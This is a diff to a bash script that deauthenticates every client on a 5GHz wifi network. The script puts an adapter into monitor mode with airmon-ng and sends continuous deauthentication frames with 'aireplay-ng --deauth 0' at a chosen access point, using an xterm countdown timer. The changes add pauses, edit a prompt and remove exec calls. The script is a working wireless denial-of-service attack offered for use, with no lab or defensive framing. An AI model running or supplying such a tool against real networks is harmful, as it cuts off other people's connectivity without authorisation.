@@ -11,9 +11,11 @@ fi
 echo "This script will deauthenticate all clients in your 5GHz wifi network"
 echo "Using a timer that will run for minutes or hours!"
 echo
+sleep 3
 echo "First lets select your wireless adapter to enable monitor mode."
 echo "To gather the info about your 5GHz AP/router:"
 echo
+sleep 3
 echo "enp=Ethernet wl=wireless lo=Loopback"
 select wifi in $(ls /sys/class/net); do
 mon=$wifi
@@ -21,7 +23,7 @@ read -p "Use $wifi:? [y/n] "
 case $REPLY in
 y|Y) break;;
 n|N) echo re-select:;;
-*) echo "Only y,Y,n,N";;
+*) echo "Only y,Y,n,N:re-select:";;
 esac
 done
 sudo airmon-ng start $mon
@@ -78,18 +80,8 @@ clear
 export TIME
 sed -i "s/time/$TIME/" timer.sh
 sleep 1
-exec sudo xterm -geometry 60x2 -e ./timer.sh &
+sudo xterm -geometry 60x2 -e ./timer.sh &
 sleep .5
-exec xterm -e sed -i "s/$TIME/time/" timer.sh &
+sed -i "s/$TIME/time/" timer.sh &
 sudo aireplay-ng -D --deauth 0 -a $BSSID $mon0
  
-
-
-
-
-
-
-
-
- 
-
